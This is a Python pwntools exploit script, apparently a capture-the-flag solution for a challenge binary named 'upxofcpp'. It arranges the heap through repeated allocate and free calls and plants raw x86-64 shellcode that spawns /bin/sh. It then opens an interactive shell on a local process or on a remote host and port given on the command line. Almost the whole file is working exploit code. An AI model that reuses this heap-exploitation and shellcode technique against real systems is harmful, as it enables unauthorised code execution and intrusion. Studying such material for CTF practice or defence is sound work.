#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
code = ELF('./upxofcpp', checksec=False)
context.arch = code.arch
context.log_level = 'debug'

def add(idx, size, data):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(idx))
    r.sendlineafter(':', str(size))
    r.sendafter(':', data)

def fre(idx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))

def tovec(s):
    t = len(s) % 4
    if t % 4:
        s += '\0' * (4-t)
    ret = unpack_many(s, 32, sign=True)
    return '\n'.join(map(str, ret))

def exploit(r):
    add(0, 0x68/4, '-1\n')
    add(1, 0x68/4, '-1\n')
    add(10, 0x1000/4, '-1\n')
    fre(0)
    fre(1)
    fre(10)
    add(2, 0x38/4, tovec("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(0x30) + asm('jmp .-0x30')) + '\n-1\n')
    fre(1) # show(1) is also OK, but i'm too lazy to write more code :P

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = code.process()
    exploit(r)
